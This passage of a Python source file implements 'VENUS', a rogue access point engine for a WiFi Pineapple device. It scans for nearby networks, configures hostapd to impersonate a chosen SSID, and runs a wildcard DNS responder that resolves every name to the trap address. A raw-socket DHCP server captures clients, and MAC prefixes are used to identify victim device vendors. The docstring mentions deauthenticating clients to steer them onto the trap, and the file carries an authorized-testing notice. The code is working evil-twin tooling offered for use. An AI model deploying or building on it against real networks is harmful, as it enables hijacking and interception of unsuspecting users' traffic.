#!/usr/bin/env python3
"""
VENUS - flytrap rogue AP engine for the WiFi Pineapple Pager.

The engine owns the radios and the network. The on-device UI (pager_ui.py)
only reads /tmp/venus_state.json and writes /tmp/venus_cmd.jsonl, so a crash
in either process never takes the other down.

Modes
    run        real hardware: recon -> trap -> capture
    simulate   fake APs/clients, no radios touched (UI development / demo)
    selftest   run the built-in assertions and exit

Authorized testing only. VENUS impersonates a Wi-Fi network and (optionally)
deauthenticates clients to steer them onto the trap. Use it only on networks
you own or have written permission to test.
"""

import argparse
import json
import os
import re
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import deque

STATE_VERSION = 1
EVENT_MAX = 64
CLIENT_HISTORY_MAX = 64

DEFAULT_AP_IP = "192.168.69.1"
AP_VIF_NAME = "venus0"
DEFAULT_STATE = "/tmp/venus_state.json"
DEFAULT_CMD = "/tmp/venus_cmd.jsonl"
DEFAULT_LOCK = "/tmp/venus.lock"

# --------------------------------------------------------------------------- #
# Small helpers
# --------------------------------------------------------------------------- #


def now():
    return time.time()


def atomic_write_json(path, obj):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(obj, f, separators=(",", ":"))
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def read_text(path, limit=65536):
    try:
        with open(path, "r", errors="ignore") as f:
            return f.read(limit)
    except Exception:
        return ""


def run(cmd, timeout=20, **kw):
    kw.setdefault("capture_output", True)
    kw.setdefault("text", True)
    # SSIDs are arbitrary bytes; never let one bad SSID abort a scan.
    kw.setdefault("errors", "replace")
    try:
        return subprocess.run(cmd, timeout=timeout, **kw)
    except Exception:
        return None


_BIN_DIRS = [
    "/usr/sbin", "/usr/bin", "/usr/local/sbin", "/usr/local/bin",
    "/mmc/usr/sbin", "/mmc/usr/bin", "/opt/usr/sbin", "/opt/usr/bin",
    "/sbin", "/bin",
]


def find_bin(*names):
    for n in names:
        try:
            r = subprocess.run(["which", n], capture_output=True, timeout=3)
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip().decode("utf-8", "ignore")
        except Exception:
            pass
        for d in _BIN_DIRS:
            cand = f"{d}/{n}"
            if os.path.isfile(cand) and os.access(cand, os.X_OK):
                return cand
    return None


def list_interfaces():
    out = run(["iw", "dev"], timeout=5)
    ifaces = []
    if out and out.stdout:
        ifaces = re.findall(r"Interface\s+(\S+)", out.stdout)
    if not ifaces:
        out = run(["iwconfig"], timeout=5)
        if out and out.stdout:
            ifaces = re.findall(r"^(\w+)\s+IEEE", out.stdout, re.M)
    return ifaces


def default_route_iface():
    out = run(["ip", "route", "show", "default"], timeout=5)
    if out and out.stdout:
        m = re.search(r"\bdev\s+(\S+)", out.stdout)
        if m:
            return m.group(1)
    return None


def set_link_mode(iface, mode):
    """mode: 'managed' or 'monitor'."""
    run(["ip", "link", "set", iface, "down"], timeout=6)
    run(["iw", iface, "set", "type", mode], timeout=6)
    run(["ip", "link", "set", iface, "up"], timeout=6)


def band_for_freq(freq):
    try:
        freq = int(freq)
    except Exception:
        return "2.4"
    if freq >= 5925:
        return "6"
    if freq >= 4900:
        return "5"
    return "2.4"


def phy_for_iface(iface):
    """Return "phyN" for a wireless interface, or None."""
    if not iface:
        return None
    dev = run(["iw", "dev"], timeout=5)
    if not dev or not dev.stdout:
        return None
    phy = None
    cur = None
    for line in dev.stdout.splitlines():
        m = re.match(r"phy#(\d+)", line)
        if m:
            cur = "phy" + m.group(1)
            continue
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m and m.group(1) == iface:
            phy = cur
            break
    return phy


def iface_band_support(iface):
    """Return the set of bands ({"2.4","5","6"}) an interface's phy has.

    Returns None when the mapping cannot be determined, so callers can choose
    to keep their existing selection instead of guessing.
    """
    phy = phy_for_iface(iface)
    if not phy:
        return None
    out = run(["iw", "phy", phy, "info"], timeout=8)
    if not out or not out.stdout:
        return None
    bands = set()
    for m in re.finditer(r"\*\s*(\d+)\s*MHz", out.stdout):
        bands.add(band_for_freq(int(m.group(1))))
    return bands or None


def iface_exists(name):
    if not name:
        return False
    return os.path.isdir("/sys/class/net/" + name) or name in list_interfaces()


def iface_mac(name):
    """Return the current MAC of an interface as "aa:bb:.." or None."""
    txt = read_text("/sys/class/net/%s/address" % name, 64).strip().lower()
    if re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", txt):
        return txt
    return None


def delete_vif(name):
    if iface_exists(name):
        run(["ip", "link", "set", name, "down"], timeout=6)
        run(["iw", "dev", name, "del"], timeout=6)
        time.sleep(0.15)


def create_ap_vif(base_iface, name):
    """Create a dedicated AP vif on the same phy as *base_iface*.

    Returns (ok, detail). On success *detail* is the vif name. Firmware 2.0.0
    ships iw 6.9, which only accepts the hidden ``__ap`` spelling.
    """
    phy = phy_for_iface(base_iface)
    if not phy:
        return False, "cannot resolve phy for %s" % (base_iface or "?")
    delete_vif(name)
    last = ""
    for typ in ("__ap", "ap"):
        r = run(["iw", "phy", phy, "interface", "add", name, "type", typ],
                timeout=8)
        if r and r.returncode == 0 and iface_exists(name):
            return True, name
        if r is not None:
            last = ((r.stderr or "") + " " + (r.stdout or "")).strip()
    return False, last or "interface add failed"


def phy_interfaces(phy):
    """List the interface names currently on a given ``phyN``."""
    if not phy:
        return []
    dev = run(["iw", "dev"], timeout=5)
    if not dev or not dev.stdout:
        return []
    out = []
    cur = None
    for line in dev.stdout.splitlines():
        m = re.match(r"phy#(\d+)", line)
        if m:
            cur = "phy" + m.group(1)
            continue
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m and cur == phy:
            out.append(m.group(1))
    return out


def iface_is_up(name):
    out = run(["ip", "link", "show", name], timeout=5)
    return bool(out and out.stdout and "state UP" in out.stdout)


def phy_is_busy(phy):
    """True if a phy is currently serving the Pager's own WiFi.

    A phy is considered busy when it carries the default-route/uplink
    interface (``wlan0cli``) or any *up* firmware management/AP virtual
    interface (``wlan0mgmt``/``wlan0open``/``wlan0wpa``/``wlan0ent``).
    Running a rogue AP on such a phy would fight the firmware for the radio
    and can knock its own connectivity/AP offline, so VENUS avoids it.
    """
    if not phy:
        return False
    dflt = default_route_iface()
    for name in phy_interfaces(phy):
        if dflt and name == dflt:
            return True
        if re.search(r"(mgmt|open|wpa|ent|cli)$", name) and iface_is_up(name):
            return True
    return False


# --------------------------------------------------------------------------- #
# OUI / vendor resolution
# --------------------------------------------------------------------------- #

# Curated prefixes for the devices a flytrap actually catches. A full IEEE
# table can be supplied with --oui-file and takes priority.
_OUI = {
    # Apple
    "000393": "Apple", "001124": "Apple", "001451": "Apple", "0017f2": "Apple",
    "001b63": "Apple", "001cb3": "Apple", "0021e9": "Apple", "00236c": "Apple",
    "002500": "Apple", "0026b0": "Apple", "003065": "Apple", "0050e4": "Apple",
    "041552": "Apple", "0c1539": "Apple", "0c3021": "Apple", "109add": "Apple",
    "14109f": "Apple", "18af61": "Apple", "1caba7": "Apple", "20c9d0": "Apple",
    "28cfe9": "Apple", "2c1f23": "Apple", "3035ad": "Apple", "34159e": "Apple",
    "3c0754": "Apple", "3c22fb": "Apple", "40a6d9": "Apple", "44d884": "Apple", "48d705": "Apple",
    "4c57ca": "Apple", "5855ca": "Apple", "5c95ae": "Apple", "60f81d": "Apple",
    "64b9e8": "Apple", "685b35": "Apple", "6c709f": "Apple", "7073cb": "Apple",
    "78ca39": "Apple", "7cd1c3": "Apple", "8863df": "Apple", "8c2937": "Apple",
    "9027e4": "Apple", "98fe94": "Apple", "a4c361": "Apple", "a82066": "Apple",
    "ac293a": "Apple", "b065bd": "Apple", "b8e856": "Apple", "bc52b7": "Apple",
    "c82a14": "Apple", "d02598": "Apple", "d49a20": "Apple", "dc2b2a": "Apple",
    "e0b9ba": "Apple", "e4c63d": "Apple", "f0dbe2": "Apple", "f4f15a": "Apple",
    "f81edf": "Apple", "000d93": "Apple",
    # Samsung
    "0012fb": "Samsung", "0015b9": "Samsung", "001632": "Samsung",
    "0017c9": "Samsung", "001e7d": "Samsung", "0021d1": "Samsung",
    "002454": "Samsung", "002608": "Samsung", "0c715d": "Samsung",
    "1077b1": "Samsung", "14568e": "Samsung", "18e2c2": "Samsung",
    "1c5a3e": "Samsung", "20d390": "Samsung", "244b03": "Samsung",
    "2ca8db": "Samsung", "34145f": "Samsung", "38aa3c": "Samsung",
    "3c5a37": "Samsung", "40d3ae": "Samsung", "44783e": "Samsung",
    "4c3c16": "Samsung", "50a4c8": "Samsung", "5492be": "Samsung",
    "5c0a5b": "Samsung", "60a10a": "Samsung", "68ebae": "Samsung",
    "6c2f2c": "Samsung", "70f927": "Samsung", "78abbb": "Samsung",
    "7c0bc6": "Samsung", "8018a7": "Samsung", "8425db": "Samsung",
    "8c7712": "Samsung", "9401c2": "Samsung", "9c3aaf": "Samsung",
    "a00798": "Samsung", "a8f274": "Samsung", "ac5a14": "Samsung",
    "b0df3a": "Samsung", "b8d9ce": "Samsung", "bc4486": "Samsung",
    "c0bdd1": "Samsung", "c819f7": "Samsung", "d0176a": "Samsung",
    "d487d8": "Samsung", "d831cf": "Samsung", "e8508b": "Samsung",
    "ec1f72": "Samsung", "f025b7": "Samsung", "f49f54": "Samsung",
    "f8042e": "Samsung",
    # Intel
    "001b21": "Intel", "001e64": "Intel", "00216a": "Intel",
    "0024d7": "Intel", "34e12d": "Intel", "3c9509": "Intel",
    "448500": "Intel", "4c3488": "Intel", "5c514f": "Intel",
    "68ecc5": "Intel", "6c8814": "Intel", "7c7a91": "Intel",
    "8086f2": "Intel", "8c1645": "Intel", "94e6f7": "Intel",
    "9c4e36": "Intel", "a0a8cd": "Intel", "b46b8c": "Intel",
    "c0e434": "Intel", "d8fc93": "Intel", "e4a471": "Intel",
    "f4b7e6": "Intel", "f8e43b": "Intel",
    # Espressif / Tuya (IoT)
    "24a43c": "Espressif", "246f28": "Espressif", "30aea4": "Espressif",
    "3c6105": "Espressif", "3c71bf": "Espressif", "5ccf7f": "Espressif",
    "600194": "Espressif", "807d3a": "Espressif", "84f3eb": "Espressif",
    "8caab5": "Espressif", "a020a6": "Espressif", "a47b9d": "Espressif",
    "b4e62d": "Espressif", "c44f33": "Espressif", "cc50e3": "Espressif",
    "d8a01d": "Espressif", "dc4f22": "Espressif", "e8db84": "Espressif",
    "ecfabc": "Espressif", "f4cfa2": "Espressif",
    "10d561": "Tuya", "18de50": "Tuya", "1c90ff": "Tuya",
    "2cd02d": "Tuya", "3c2eff": "Tuya", "508a06": "Tuya",
    "54f15f": "Tuya", "5c0272": "Tuya", "60b647": "Tuya",
    "68572d": "Tuya", "70f11c": "Tuya", "74e182": "Tuya",
    "7cf666": "Tuya", "84e342": "Tuya", "8c8d28": "Tuya",
    "a0e4cb": "Tuya", "b0f893": "Tuya", "c4dd57": "Tuya",
    "d4a651": "Tuya", "e0e5cf": "Tuya", "f08cfe": "Tuya",
    # Amazon / Google / streaming
    "0014d1": "Amazon", "0c47c9": "Amazon", "18742e": "Amazon",
    "1c12b0": "Amazon", "34d270": "Amazon", "40b4cd": "Amazon",
    "44650d": "Amazon", "4c1744": "Amazon", "50dce6": "Amazon",
    "5c415a": "Amazon", "6837e9": "Amazon", "6c5697": "Amazon",
    "74c246": "Amazon", "78e103": "Amazon", "84d6d0": "Amazon",
    "8c4cad": "Amazon", "a002dc": "Amazon", "a49981": "Amazon",
    "ac63be": "Amazon", "b0fc36": "Amazon", "b47c9c": "Amazon",
    "c8d15d": "Amazon", "ccf535": "Amazon", "d017c2": "Amazon",
    "e8611f": "Amazon", "f0272d": "Amazon", "f4f5d8": "Amazon",
    "fca183": "Amazon",
    "001a11": "Google", "3c5ab4": "Google", "546009": "Google",
    "6cadf8": "Google", "94eb2c": "Google", "a47733": "Google",
    "d86c63": "Google", "f4f5e8": "Google", "001a79": "Google",
    "001b11": "Google",
    "001bdc": "Roku", "b0a737": "Roku", "cc6da0": "Roku",
    "d04d2c": "Roku", "dc3a5e": "Roku",
    "000420": "Sonos", "347e5c": "Sonos", "48a6b8": "Sonos",
    "5caafd": "Sonos", "7828ca": "Sonos", "b8e937": "Sonos",
    "000e58": "Sonos",
    # Network / compute
    "0009b0": "Cisco", "001aa1": "Cisco", "001b0c": "Cisco",
    "002497": "Cisco",
    "005056": "VMware", "000c29": "VMware", "001c42": "Parallels",
    "080027": "VirtualBox",
    "001b44": "SanDisk", "00265e": "HP", "3cd92b": "HP",
    "00215a": "HP", "0025b3": "HP", "a0d37a": "Dell",
    "001422": "Dell", "001ec9": "Dell", "180373": "Dell",
    "001a8c": "Sony", "001dba": "Sony", "30f9ed": "Sony",
    "001e52": "Sony",
    "00044b": "Microsoft", "00125a": "Microsoft",
    "00155d": "Microsoft", "281878": "Microsoft",
    "6045bd": "Microsoft", "7c1e52": "Microsoft",
    "000c43": "MediaTek", "000e8e": "MediaTek",
    "000f66": "MediaTek", "0017a5": "MediaTek",
    "001c10": "Realtek", "00e04c": "Realtek",
    "005043": "Marvell", "001f1f": "Marvell",
    "0024b2": "Netgear", "204e7f": "Netgear",
    "28c68e": "Netgear", "a040a0": "Netgear",
    "001cf0": "D-Link", "0022b0": "D-Link",
    "00265a": "D-Link", "1c7ee5": "D-Link",
    "000c6e": "Asus", "001bfc": "Asus", "2c56dc": "Asus",
    "001e58": "Ubiquiti", "0418d6": "Ubiquiti",
    "44d9e7": "Ubiquiti", "68d79a": "Ubiquiti", "788a20": "Ubiquiti",
    "b827eb": "Raspberry Pi", "dca632": "Raspberry Pi",
    "e45f01": "Raspberry Pi",
}
_EXTERNAL_OUI = {}


def load_oui_file(path):
    """Load nmap-mac-prefixes / IEEE oui.txt / oui.csv into _EXTERNAL_OUI."""
    if not path or not os.path.isfile(path):
        return 0
    n = 0
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                m = re.match(r"^([0-9A-Fa-f]{6})\s*\(hex\)\s*\t?(.+)$", line)
                if m:
                    _EXTERNAL_OUI[m.group(1).lower()] = m.group(2).strip()
                    n += 1
                    continue
                # oui.csv: Registry,Assignment,Organization Name,...
                parts = line.split(",")
                if len(parts) >= 3 and re.match(r"^[0-9A-Fa-f]{6}$", parts[1].strip()):
                    _EXTERNAL_OUI[parts[1].strip().lower()] = parts[2].strip().strip('"')
                    n += 1
                    continue
                # oui.txt: XX-XX-XX   (hex)       Vendor
                m = re.match(r"^([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})\s+\(hex\)\s+(.+)$", line)
                if m:
                    _EXTERNAL_OUI[(m.group(1) + m.group(2) + m.group(3)).lower()] = m.group(4).strip()
                    n += 1
    except Exception:
        pass
    return n


def is_random_mac(mac):
    try:
        first = int(mac.split(":")[0], 16)
        return bool(first & 0x02)
    except Exception:
        return False


def is_multicast_mac(mac):
    try:
        first = int(mac.split(":")[0], 16)
        return bool(first & 0x01)
    except Exception:
        return False


def vendor_for_mac(mac, oui_file=None):
    if not mac or len(mac) < 8:
        return "Unknown"
    if is_multicast_mac(mac):
        return "Unknown"
    if is_random_mac(mac):
        return "Private (randomized)"
    prefix = mac.replace(":", "").replace("-", "").lower()[:6]
    if oui_file:
        _load_external_once(oui_file)
    if prefix in _EXTERNAL_OUI:
        return _EXTERNAL_OUI[prefix]
    if prefix in _OUI:
        return _OUI[prefix]
    return "Unknown"


_LOADED_OUI_FILES = set()


def _load_external_once(path):
    if path in _LOADED_OUI_FILES:
        return
    _LOADED_OUI_FILES.add(path)
    load_oui_file(path)


# --------------------------------------------------------------------------- #
# Parsers (all pure functions, unit tested)
# --------------------------------------------------------------------------- #

_MAC_RE = re.compile(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")


def parse_station_dump(text):
    """Parse `iw dev <iface> station dump` into {mac: {...}}."""
    stations = {}
    cur = None
    for raw in (text or "").splitlines():
        line = raw.strip()
        m = re.match(r"Station\s+([0-9a-fA-F:]{17})", line)
        if m:
            cur = m.group(1).lower()
            stations[cur] = {
                "rssi": None, "rx_bytes": 0, "tx_bytes": 0,
                "connected_time": 0, "inactive_time": None,
            }
            continue
        if not cur:
            continue
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key = key.strip().lower()
        val = val.strip()
        st = stations[cur]
        if key == "signal":
            mm = re.search(r"-?\d+", val)
            if mm:
                st["rssi"] = int(mm.group(0))
        elif key == "rx bytes":
            st["rx_bytes"] = _to_int(val)
        elif key == "tx bytes":
            st["tx_bytes"] = _to_int(val)
        elif key == "connected time":
            st["connected_time"] = _to_int(val)
        elif key == "inactive time":
            st["inactive_time"] = _to_int(val)
    return stations


def _to_int(v):
    try:
        return int(str(v).split()[0])
    except Exception:
        return 0


def parse_leases(text):
    """Parse dnsmasq leases: expiry mac ip hostname clientid -> {mac: {...}}."""
    leases = {}
    for line in (text or "").splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        mac = parts[1].lower()
        if not _MAC_RE.fullmatch(mac):
            continue
        hostname = parts[3] if len(parts) > 3 else ""
        if hostname == "*":
            hostname = ""
        leases[mac] = {
            "expiry": _to_int(parts[0]),
            "ip": parts[2],
            "hostname": hostname,
        }
    return leases


def parse_arp(text):
    """Parse /proc/net/arp into {mac: ip}."""
    mapping = {}
    for line in (text or "").splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 4:
            ip, mac = parts[0], parts[3].lower()
            if _MAC_RE.fullmatch(mac) and mac != "00:00:00:00:00:00":
                mapping[mac] = ip
    return mapping


def parse_iw_scan(output):
    """Parse `iw dev <iface> scan` into a list of AP dicts."""
    aps = []
    cur = None

    def finalize(c):
        if not c or not c.get("bssid"):
            return
        f = c.pop("_flags", {})
        if f.get("sae"):
            c["enc"] = "WPA3"
        elif f.get("rsn"):
            c["enc"] = "WPA2"
        elif f.get("wpa"):
            c["enc"] = "WPA"
        elif f.get("privacy"):
            c["enc"] = "WEP"
        else:
            c["enc"] = "OPN"
        c["ssid"] = c.get("ssid") or ""
        aps.append(c)

    for raw in (output or "").splitlines():
        line = raw.strip()
        m = re.match(r"BSS\s+([0-9a-fA-F:]{17})", line)
        if m:
            finalize(cur)
            cur = {
                "bssid": m.group(1).lower(), "ssid": "", "channel": 0,
                "freq": 0, "rssi": -100, "enc": "OPN", "band": "2.4",
                "_flags": {},
            }
            continue
        if cur is None:
            continue
        m = re.match(r"freq:\s*(\d+)", line)
        if m:
            cur["freq"] = int(m.group(1))
            cur["band"] = band_for_freq(cur["freq"])
            continue
        m = re.match(r"signal:\s*(-?\d+(?:\.\d+)?)", line)
        if m:
            cur["rssi"] = int(float(m.group(1)))
            continue
        m = re.match(r"SSID:\s*(.*)", line)
        if m:
            cur["ssid"] = m.group(1).strip()
            continue
        m = re.match(r"DS Parameter set:\s*channel\s*(\d+)", line)
        if m:
            cur["channel"] = int(m.group(1))
            continue
        m = re.match(r"primary channel:\s*(\d+)", line)
        if m and not cur["channel"]:
            cur["channel"] = int(m.group(1))
            continue
        flags = cur["_flags"]
        if line.startswith("RSN:"):
            flags["rsn"] = True
        if "SAE" in line:
            flags["sae"] = True
        if line.startswith("WPA:") or line.startswith("WPA2:"):
            flags["wpa"] = True
        if "capability:" in line and "Privacy" in line:
            flags["privacy"] = True
    finalize(cur)
    return aps


def channel_from_scan(ap, fallback=6):
    ch = ap.get("channel") or 0
    if 1 <= ch <= 233:
        return int(ch)
    # Derive from frequency when the scan omitted the channel.
    freq = ap.get("freq") or 0
    if freq == 2484:
        return 14
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    if 5000 <= freq <= 5900:
        return (freq - 5000) // 5
    if 5950 <= freq <= 7125:
        return (freq - 5950) // 5
    return fallback


def build_hostapd_conf(iface, ssid, channel, freq=0, password="", country="US",
                       minimal=False):
    """Return a hostapd.conf string for open or WPA2-PSK.

    *minimal* drops optional 802.11n/ac/ax extensions so the config survives
    the firmware's ``wpad-basic-mbedtls`` if it rejects an advanced option.
    """
    band = band_for_freq(freq) if freq else ("5" if int(channel) > 14 else "2.4")
    lines = [
        f"interface={iface}",
        "driver=nl80211",
        f"ssid={ssid}",
        "ctrl_interface=/var/run/hostapd",
        "ctrl_interface_group=0",
        "auth_algs=1",
        "ignore_broadcast_ssid=0",
    ]
    if not minimal:
        lines.append("wmm_enabled=1")
    if band == "6":
        lines += [
            "hw_mode=a",
            f"channel={channel}",
            "ieee80211d=1",
            f"country_code={country}",
        ]
        if not minimal:
            lines += ["ieee80211n=1", "ieee80211ax=1", "he_oper_chwidth=0",
                      "op_class=131"]
    elif band == "5":
        lines += [
            "hw_mode=a",
            f"channel={channel}",
            "ieee80211d=1",
            f"country_code={country}",
        ]
        if not minimal:
            lines += ["ieee80211n=1", "ieee80211ac=1", "vht_oper_chwidth=0"]
    else:
        lines += [
            "hw_mode=g",
            f"channel={channel}",
        ]
        if not minimal:
            lines.append("ieee80211n=1")
    if password and len(password) >= 8:
        lines += [
            "wpa=2",
            f"wpa_passphrase={password}",
            "wpa_key_mgmt=WPA-PSK",
            "rsn_pairwise=CCMP",
        ]
    return "\n".join(lines) + "\n"


def build_dnsmasq_conf(iface, ip, leasefile, pidfile, dns=True):
    lines = [
        f"interface={iface}",
        "bind-interfaces",
        f"dhcp-range={_subnet(ip).rsplit('.', 1)[0]}.10,{_subnet(ip).rsplit('.', 1)[0]}.100,12h",
        f"dhcp-option=3,{ip}",
        f"dhcp-option=6,{ip}",
        f"dhcp-leasefile={leasefile}",
        f"pid-file={pidfile}",
        "dhcp-authoritative",
    ]
    if dns:
        lines += [f"address=/#/{ip}", "no-resolv", "log-queries"]
    else:
        lines += ["port=0"]
    return "\n".join(lines) + "\n"


def _subnet(ip):
    parts = ip.split(".")
    while len(parts) < 4:
        parts.append("0")
    return ".".join(parts[:3]) + ".0"


def build_dns_response(query, answer_ip):
    """Minimal A-record answer for any name. Returns bytes or None."""
    if not query or len(query) < 12:
        return None
    tid = query[:2]
    flags = query[2:4]
    if flags[0] & 0x80:  # already a response
        return None
    i = 12
    while i < len(query) and query[i] != 0:
        i += query[i] + 1
    i += 1
    if i + 4 > len(query):
        return None
    qtype = struct.unpack("!H", query[i:i + 2])[0]
    question = query[12:i + 4]
    ip = socket.inet_aton(answer_ip)
    if qtype not in (1, 255):  # A or ANY
        return (tid + b"\x81\x80" + b"\x00\x01" + b"\x00\x00"
                + b"\x00\x00" + b"\x00\x00" + question)
    answer = (
        b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01"
        + struct.pack("!I", 30) + b"\x00\x04" + ip
    )
    return (tid + b"\x81\x80" + b"\x00\x01" + b"\x00\x01"
            + b"\x00\x00" + b"\x00\x00" + question + answer)


# --------------------------------------------------------------------------- #
# Wildcard DNS fallback
# --------------------------------------------------------------------------- #

class MiniDNS(threading.Thread):
    def __init__(self, bind_ip, answer_ip, port=53):
        super().__init__(daemon=True)
        self.bind_ip = bind_ip
        self.answer_ip = answer_ip
        self.port = port
        self._stop = threading.Event()
        self.sock = None
        self.error = None

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.bind_ip, self.port))
            s.settimeout(0.5)
            self.sock = s
        except Exception as e:
            self.error = str(e)
            return
        while not self._stop.is_set():
            try:
                data, addr = self.sock.recvfrom(2048)
            except socket.timeout:
                continue
            except Exception:
                break
            resp = build_dns_response(data, self.answer_ip)
            if resp:
                try:
                    self.sock.sendto(resp, addr)
                except Exception:
                    pass
        try:
            self.sock.close()
        except Exception:
            pass

    def stop(self):
        self._stop.set()


# --------------------------------------------------------------------------- #
# DHCP server (AF_PACKET, no port-67 conflict with the firmware dnsmasq)
# --------------------------------------------------------------------------- #

DHCP_MAGIC = b"\x63\x82\x53\x63"
ETH_P_IP = 0x0800
# BOOTP op / message-type codes
_DHCP_DISCOVER, _DHCP_OFFER, _DHCP_REQUEST, _DHCP_DECLINE = 1, 2, 3, 4
_DHCP_ACK, _DHCP_NAK, _DHCP_RELEASE, _DHCP_INFORM = 5, 6, 7, 8
_OPT_MSG_TYPE, _OPT_REQUESTED_IP, _OPT_LEASE_TIME, _OPT_SERVER_ID = 53, 50, 51, 54
_OPT_SUBNET, _OPT_ROUTER, _OPT_DNS, _OPT_HOSTNAME = 1, 3, 6, 12


def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def _dhcp_option(code, value):
    if isinstance(value, int):
        value = bytes([value])
    return bytes([code, len(value)]) + value


def _parse_dhcp_options(buf):
    opts = {}
    i = 0
    while i + 2 <= len(buf):
        code = buf[i]
        if code == 0:
            i += 1
            continue
        if code == 255:
            break
        ln = buf[i + 1]
        val = buf[i + 2:i + 2 + ln]
        if len(val) < ln:
            break
        if code in (_OPT_MSG_TYPE,):
            opts[code] = val[0] if val else None
        else:
            opts[code] = val
        i += 2 + ln
    return opts


def parse_dhcp_packet(data):
    """Parse a BOOTREQUEST payload. Returns a dict or None."""
    if not data or len(data) < 240 or data[236:240] != DHCP_MAGIC:
        return None
    if data[0] != 1 or data[1] != 1 or data[2] != 6:
        return None
    chaddr = data[28:34]
    mac = ":".join("%02x" % b for b in chaddr)
    if mac == "00:00:00:00:00:00":
        return None
    opts = _parse_dhcp_options(data[240:])
    mtype = opts.get(_OPT_MSG_TYPE)
    if mtype is None:
        return None
    ciaddr = data[12:16]
    return {
        "op": data[0], "xid": data[4:8],
        "flags": struct.unpack("!H", data[10:12])[0],
        "ciaddr": socket.inet_ntoa(ciaddr) if ciaddr != b"\x00" * 4 else "",
        "mac": mac, "chaddr": chaddr,
        "type": mtype, "options": opts,
    }


def build_dhcp_reply(req, msg_type, yiaddr, server_ip, lease_time=43200,
                     netmask="255.255.255.0", router=None, dns=None,
                     broadcast=False):
    """Return the raw BOOTREPLY payload bytes for a parsed request."""
    router = router or server_ip
    dns = dns or server_ip
    flags = 0x8000 if broadcast else 0
    yiaddr_b = socket.inet_aton(yiaddr) if yiaddr else b"\x00" * 4
    header = (
        bytes([2, 1, 6, 0]) + req["xid"] + struct.pack("!HH", 0, flags)
        + b"\x00" * 4 + yiaddr_b + b"\x00" * 4 + b"\x00" * 4
        + req["chaddr"] + b"\x00" * (16 - len(req["chaddr"]))
        + b"\x00" * 64 + b"\x00" * 128 + DHCP_MAGIC
    )
    opts = [_dhcp_option(_OPT_MSG_TYPE, msg_type),
            _dhcp_option(_OPT_SERVER_ID, socket.inet_aton(server_ip))]
    if msg_type in (_DHCP_OFFER, _DHCP_ACK):
        opts += [
            _dhcp_option(_OPT_LEASE_TIME, struct.pack("!I", lease_time)),
            _dhcp_option(_OPT_SUBNET, socket.inet_aton(netmask)),
            _dhcp_option(_OPT_ROUTER, socket.inet_aton(router)),
            _dhcp_option(_OPT_DNS, socket.inet_aton(dns)),
        ]
        if msg_type == _DHCP_ACK:
            opts.append(_dhcp_option(28, socket.inet_aton(_broadcast_of(
                server_ip, netmask))))
    opts.append(b"\xff")
    body = header + b"".join(opts)
    # DHCP messages should be at least 300 bytes on the wire.
    if len(body) < 300:
        body += b"\x00" * (300 - len(body))
    return body


def _broadcast_of(ip, netmask):
    ipb = socket.inet_aton(ip)
    mb = socket.inet_aton(netmask)
    return socket.inet_ntoa(bytes(a | (~b & 0xff) for a, b in zip(ipb, mb)))


def build_udp_ip_frame(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port,
                       payload):
    """Build a full Ethernet+IPv4+UDP frame with correct checksums."""
    src_mac_b = bytes(int(x, 16) for x in src_mac.split(":"))
    dst_mac_b = bytes(int(x, 16) for x in dst_mac.split(":"))
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0) + payload
    pseudo = (socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
              + struct.pack("!BBH", 0, 17, udp_len))
    csum = _checksum(pseudo + udp)
    if csum == 0:
        csum = 0xffff
    udp = udp[:6] + struct.pack("!H", csum) + udp[8:]
    total = 20 + len(udp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0, 0, 64, 17, 0,
                     socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip = ip[:10] + struct.pack("!H", _checksum(ip)) + ip[12:]
    return (dst_mac_b + src_mac_b + struct.pack("!H", ETH_P_IP) + ip + udp)


class DHCPResponder(threading.Thread):
    """Minimal DHCP server speaking raw Ethernet on the AP vif.

    Binding is via AF_PACKET so it never competes with the firmware dnsmasq
    (which owns UDP :67). It hands out addresses from the AP subnet, writes a
    dnsmasq-compatible lease file for the engine, and answers OFFER/ACK/NAK.
    """

    def __init__(self, iface, server_ip, leasefile, engine=None,
                 netmask="255.255.255.0", pool_start=10, pool_end=100,
                 lease_time=43200):
        super().__init__(daemon=True)
        self.iface = iface
        self.server_ip = server_ip
        self.leasefile = leasefile
        self.engine = engine
        self.netmask = netmask
        self.pool_start = pool_start
        self.pool_end = pool_end
        self.lease_time = lease_time
        self.mac = iface_mac(iface) or "02:00:00:00:00:01"
        self._stop = threading.Event()
        self.sock = None
        self.error = None
        self._leases = {}   # mac -> {"ip","expiry","hostname"}
        self._offers = {}   # mac -> (ip, expiry)
        self._bad = {}      # ip -> expiry
        self._lock = threading.Lock()
        self._last_write = 0.0

    def log(self, kind, text, data=None):
        if self.engine is not None:
            try:
                self.engine.log_event(kind, text, data)
            except Exception:
                pass

    def run(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              socket.htons(ETH_P_IP))
            s.bind((self.iface, 0))
            s.settimeout(0.5)
            self.sock = s
        except Exception as e:
            self.error = str(e)
            return
        while not self._stop.is_set():
            try:
